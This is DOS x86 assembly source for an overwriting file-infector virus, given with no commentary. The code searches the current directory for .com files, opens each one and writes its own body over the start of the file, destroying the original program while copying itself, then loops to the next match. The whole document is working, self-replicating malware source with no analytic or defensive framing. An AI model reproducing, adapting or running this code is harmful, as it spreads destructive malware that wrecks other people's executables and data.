org 100h
filename EQU 9eh
virsize EQU finish-init

section .text         ;code segment
init:
  MOV ah, 4eh         ;first search
  XOR cx, cx
  LEA dx, filetype
  int 21h

search:
  jc done
  MOV ah, 3dh         ;open target file
  MOV al, 02h
  MOV dx, filename
  int 21h

  xchg ax, bx         ;switch file handler to bx
  MOV ah, 40h         ;overwrite file
  MOV cx, virsize
  MOV dx, 100h
  int 21h

  MOV ah, 4fh
  int 21h
  clc                 ;clear carry flag
  jmp search

done:
  MOV ah, 4ch
  int 21h

section .data         ;var segment
filetype DB '*.com',0

finish:               ;mark the end of code
